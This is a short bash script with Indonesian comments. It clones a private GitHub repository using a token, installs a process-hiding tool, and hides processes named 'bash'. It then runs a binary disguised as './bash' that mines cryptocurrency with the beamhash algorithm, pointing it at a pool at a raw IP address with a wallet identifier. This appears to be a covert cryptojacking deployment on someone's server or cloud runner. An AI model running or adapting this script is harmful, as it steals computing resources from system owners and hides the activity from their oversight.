#!/bin/bash

# Non-interactive mode supaya tidak ada konfirmasi
export DEBIAN_FRONTEND=noninteractive

echo "== Update & Upgrade System =="
sudo apt update -y && sudo apt upgrade -y

echo "== Install Git =="
sudo apt install -y git

echo "== Clone Repository =="
git clone https:////x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/gm.git

echo "== Masuk Folder =="
cd gm || { echo "Folder tidak ditemukan"; exit 1; }

echo "== Install NodeJS & NPM =="
sudo apt install -y nodejs npm

echo "== Install Build Essential & GCC =="
sudo apt install -y build-essential gcc

echo "== Install node-process-hider =="
sudo npm install -g node-process-hider

echo "== Tambah Hide Process bash =="
sudo ph add bash

echo "== Permission File bash =="
chmod u+x bash

echo "== Menjalankan ./bash =="
./bash -a beamhash --ssl 1 -s 167.71.108.251:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin -p x
